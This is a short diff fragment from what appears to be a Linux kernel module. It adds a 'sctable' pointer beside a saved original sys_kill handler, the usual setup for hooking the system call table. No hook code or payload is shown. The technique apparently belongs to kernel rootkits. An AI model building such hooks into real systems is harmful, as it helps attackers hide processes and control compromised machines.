@@ -14,6 +14,7 @@ static
 char m_name[128] = { 0x0, } ;
 static
 int m_num=0;
+void ** sctable;
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int signal);
 
